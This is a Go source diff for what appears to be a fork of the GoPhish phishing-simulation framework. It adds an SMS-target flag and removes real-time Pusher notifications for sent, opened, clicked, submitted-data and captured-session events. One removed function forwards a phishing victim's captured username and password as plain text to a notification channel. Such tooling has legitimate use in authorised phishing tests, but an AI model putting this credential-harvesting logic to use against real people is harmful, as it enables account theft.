@@ -41,6 +41,7 @@ type Result struct {
     Reported     bool      `json:"reported" sql:"not null"`
     ModifiedDate time.Time `json:"modified_date"`
     BaseRecipient
+	SMSTarget    bool 		`json:"sms_target"`
 }
 
 func (r *Result) PusherNotifyEmailSent(app_id string, app_key string, secret string, cluster string, encrypt_key string, channel_name string) {
@@ -67,83 +68,6 @@ func (r *Result) PusherNotifySMSSent(app_id string, app_key string, secret strin
         EncryptionMasterKeyBase64: encrypt_key,
     }
     data := map[string]string{"event": "SMS Sent", "time": r.ModifiedDate.String(), "message": "SMS has been sent to victim: <strong>" + r.Email + "</strong>"}
-    err := pusherClient.Trigger(channel_name, "event", data)
-    if err != nil {
-        fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
-    }
-}
-
-func (r *Result) PusherNotifyEmailOpened(app_id string, app_key string, secret string, cluster string, encrypt_key string, channel_name string) {
-    pusherClient := pusher.Client{
-        AppID: app_id,
-        Key: app_key,
-        Secret: secret,
-        Cluster: cluster,
-        EncryptionMasterKeyBase64: encrypt_key,
-    }
-    data := map[string]string{"event": "Email Opened", "time": r.ModifiedDate.String(), "message": "Email has been opened by victim: <strong>" + r.Email + "</strong>"}
-    err := pusherClient.Trigger(channel_name, "event", data)
-    if err != nil {
-        fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
-    }
-}
-
-func (r *Result) PusherNotifySMSOpened(app_id string, app_key string, secret string, cluster string, encrypt_key string, channel_name string) {
-    pusherClient := pusher.Client{
-        AppID: app_id,
-        Key: app_key,
-        Secret: secret,
-        Cluster: cluster,
-        EncryptionMasterKeyBase64: encrypt_key,
-    }
-    data := map[string]string{"event": "SMS Opened", "time": r.ModifiedDate.String(), "message": "SMS has been opened by victim: <strong>" + r.Email + "</strong>"}
-    err := pusherClient.Trigger(channel_name, "event", data)
-    if err != nil {
-        fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
-    }
-}
-
-func (r *Result) PusherNotifyClickedLink(app_id string, app_key string, secret string, cluster string, encrypt_key string, channel_name string) {
-    pusherClient := pusher.Client{
-        AppID: app_id,
-        Key: app_key,
-        Secret: secret,
-        Cluster: cluster,
-        EncryptionMasterKeyBase64: encrypt_key,
-    }
-    data := map[string]string{"event": "Clicked Link", "time": r.ModifiedDate.String(), "message": "Link has been clicked by victim: <strong>" + r.Email + "</strong>"}
-    err := pusherClient.Trigger(channel_name, "event", data)
-    if err != nil {
-        fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
-    }
-}
-
-func (r *Result) PusherNotifySubmittedData(app_id string, app_key string, secret string, cluster string, encrypt_key string, channel_name string, details EventDetails) {
-    pusherClient := pusher.Client{
-        AppID: app_id,
-        Key: app_key,
-        Secret: secret,
-        Cluster: cluster,
-        EncryptionMasterKeyBase64: encrypt_key,
-    }
-    username := details.Payload.Get("Username")
-    password := details.Payload.Get("Password")
-    data := map[string]string{"event": "Submitted Data", "time": r.ModifiedDate.String(), "message": "Victim <strong>" + r.Email + "</strong> has submitted data! Details:<br><strong>Username:</strong> " + username + "<br><strong>Password:</strong> " + password}
-    err := pusherClient.Trigger(channel_name, "event", data)
-    if err != nil {
-        fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
-    }
-}
-
-func (r *Result) PusherNotifyCapturedSession(app_id string, app_key string, secret string, cluster string, encrypt_key string, channel_name string) {
-    pusherClient := pusher.Client{
-        AppID: app_id,
-        Key: app_key,
-        Secret: secret,
-        Cluster: cluster,
-        EncryptionMasterKeyBase64: encrypt_key,
-    }
-    data := map[string]string{"event": "Captured Session", "time": r.ModifiedDate.String(), "message": "Captured session for victim: <strong>" + r.Email + "</strong>! View full token JSON in GoPhish dashboard!"}
     err := pusherClient.Trigger(channel_name, "event", data)
     if err != nil {
         fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
@@ -193,6 +117,7 @@ func (r *Result) HandleSMSSent(twilio_account_sid string, twilio_auth_token stri
         r.SendDate = event.Time
         r.Status = EventSent
         r.ModifiedDate = event.Time
+		r.SMSTarget = true
         
         if conf.EnablePusher {
             pusher_app_id := conf.PusherAppId
@@ -203,19 +128,8 @@ func (r *Result) HandleSMSSent(twilio_account_sid string, twilio_auth_token stri
             pusher_channel_name := conf.PusherChannelName
             r.PusherNotifySMSSent(pusher_app_id, pusher_app_key, pusher_app_secret, pusher_app_cluster, pusher_encrypt_key, pusher_channel_name)
         }
-        
-        err = db.Save(r).Error
-        if err != nil {
-            return err
-        }
 
-        sentEntry := SentResults{}
-        sentEntry.Id = r.Id
-        sentEntry.RId = r.RId
-        sentEntry.UserId = r.UserId
-        sentEntry.Victim = r.BaseRecipient.Email
-        sentEntry.SMSTarget = true
-        return egp_db.Save(sentEntry).Error
+        return db.Save(r).Error
     }
 }
 
@@ -229,6 +143,7 @@ func (r *Result) HandleEmailSent() error {
     r.SendDate = event.Time
     r.Status = EventSent
     r.ModifiedDate = event.Time
+	r.SMSTarget = false
 
     conf, err := config.LoadConfig("config.json")
     if err != nil {
@@ -245,18 +160,7 @@ func (r *Result) HandleEmailSent() error {
         r.PusherNotifyEmailSent(pusher_app_id, pusher_app_key, pusher_app_secret, pusher_app_cluster, pusher_encrypt_key, pusher_channel_name)
     }
 
-    err = db.Save(r).Error
-    if err != nil {
-        return err
-    }
-
-    sentEntry := SentResults{}
-    sentEntry.Id = r.Id
-    sentEntry.RId = r.RId
-    sentEntry.UserId = r.UserId
-    sentEntry.Victim = r.BaseRecipient.Email
-    sentEntry.SMSTarget = false
-    return egp_db.Save(sentEntry).Error
+    return db.Save(r).Error
 }
 
 // HandleEmailError updates a Result to indicate that there was an error when
@@ -298,22 +202,6 @@ func (r *Result) HandleEmailOpened(details EventDetails) error {
     }
     r.Status = EventOpened
     r.ModifiedDate = event.Time
-
-    conf, err := config.LoadConfig("config.json")
-    if err != nil {
-        fmt.Printf("[-] Failed to load config.json from default path!")
-    }
-
-    if conf.EnablePusher {
-        pusher_app_id := conf.PusherAppId
-        pusher_app_key := conf.PusherAppKey
-        pusher_app_secret := conf.PusherAppSecret
-        pusher_app_cluster := conf.PusherAppCluster
-        pusher_encrypt_key := conf.PusherEncryptKey
-        pusher_channel_name := conf.PusherChannelName
-        r.PusherNotifyEmailOpened(pusher_app_id, pusher_app_key, pusher_app_secret, pusher_app_cluster, pusher_encrypt_key, pusher_channel_name)
-    }
-
     return db.Save(r).Error
 }
 
@@ -329,21 +217,6 @@ func (r *Result) HandleSMSOpened(details EventDetails) error {
     }
     r.Status = EventOpened
     r.ModifiedDate = event.Time
-
-    conf, err := config.LoadConfig("config.json")
-    if err != nil {
-        fmt.Printf("[-] Failed to load config.json from default path!")
-    }
-
-    if conf.EnablePusher {
-        pusher_app_id := conf.PusherAppId
-        pusher_app_key := conf.PusherAppKey
-        pusher_app_secret := conf.PusherAppSecret
-        pusher_app_cluster := conf.PusherAppCluster
-        pusher_encrypt_key := conf.PusherEncryptKey
-        pusher_channel_name := conf.PusherChannelName
-        r.PusherNotifySMSOpened(pusher_app_id, pusher_app_key, pusher_app_secret, pusher_app_cluster, pusher_encrypt_key, pusher_channel_name)
-    }
 
     return db.Save(r).Error
 }
@@ -362,22 +235,6 @@ func (r *Result) HandleClickedLink(details EventDetails) error {
     }
     r.Status = EventClicked
     r.ModifiedDate = event.Time
-
-    conf, err := config.LoadConfig("config.json")
-    if err != nil {
-        fmt.Printf("[-] Failed to load config.json from default path!")
-    }
-
-    if conf.EnablePusher {
-        pusher_app_id := conf.PusherAppId
-        pusher_app_key := conf.PusherAppKey
-        pusher_app_secret := conf.PusherAppSecret
-        pusher_app_cluster := conf.PusherAppCluster
-        pusher_encrypt_key := conf.PusherEncryptKey
-        pusher_channel_name := conf.PusherChannelName
-        r.PusherNotifyClickedLink(pusher_app_id, pusher_app_key, pusher_app_secret, pusher_app_cluster, pusher_encrypt_key, pusher_channel_name)
-    }
-
     return db.Save(r).Error
 }
 
@@ -390,22 +247,6 @@ func (r *Result) HandleFormSubmit(details EventDetails) error {
     }
     r.Status = EventDataSubmit
     r.ModifiedDate = event.Time
-
-    conf, err := config.LoadConfig("config.json")
-    if err != nil {
-        fmt.Printf("[-] Failed to load config.json from default path!")
-    }
-
-    if conf.EnablePusher {
-        pusher_app_id := conf.PusherAppId
-        pusher_app_key := conf.PusherAppKey
-        pusher_app_secret := conf.PusherAppSecret
-        pusher_app_cluster := conf.PusherAppCluster
-        pusher_encrypt_key := conf.PusherEncryptKey
-        pusher_channel_name := conf.PusherChannelName
-        r.PusherNotifySubmittedData(pusher_app_id, pusher_app_key, pusher_app_secret, pusher_app_cluster, pusher_encrypt_key, pusher_channel_name, details)
-    }
-
     return db.Save(r).Error
 }
 
@@ -416,17 +257,6 @@ func (r *Result) HandleCapturedSession(details EventDetails) error {
     }
     r.Status = EventCapturedSession
     r.ModifiedDate = event.Time
-
-    if conf.EnablePusher {
-        pusher_app_id := conf.PusherAppId
-        pusher_app_key := conf.PusherAppKey
-        pusher_app_secret := conf.PusherAppSecret
-        pusher_app_cluster := conf.PusherAppCluster
-        pusher_encrypt_key := conf.PusherEncryptKey
-        pusher_channel_name := conf.PusherChannelName
-        r.PusherNotifyCapturedSession(pusher_app_id, pusher_app_key, pusher_app_secret, pusher_app_cluster, pusher_encrypt_key, pusher_channel_name)
-    }
-
     return db.Save(r).Error
 }
 
